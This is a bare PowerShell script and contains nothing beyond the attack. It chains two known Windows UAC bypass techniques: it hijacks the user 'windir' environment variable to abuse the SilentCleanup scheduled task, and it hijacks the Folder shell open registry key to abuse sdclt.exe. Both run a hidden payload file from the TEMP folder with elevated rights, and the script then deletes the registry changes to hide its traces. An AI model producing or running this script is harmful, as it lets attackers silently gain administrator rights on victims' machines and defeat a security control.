param([string]$payloadFile = "$env:TEMP\maintenance-stage.ps1")
$command = "powershell.exe -NoProfile -WindowStyle Hidden -File `"$payloadFile`""
Set-ItemProperty -Path 'HKCU:\Environment' -Name 'windir' -Value "$command & rem "
Start-Process schtasks.exe -ArgumentList '/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I' -Wait
Start-Sleep -Seconds 2
Remove-ItemProperty -Path 'HKCU:\Environment' -Name 'windir'
$association = 'HKCU:\Software\Classes\Folder\shell\open\command'
New-Item -Path $association -Force | Out-Null
Set-Item -Path $association -Value $command
Start-Process sdclt.exe -ArgumentList '/KickOffElev' -Wait
Remove-Item -Path $association -Recurse -Force
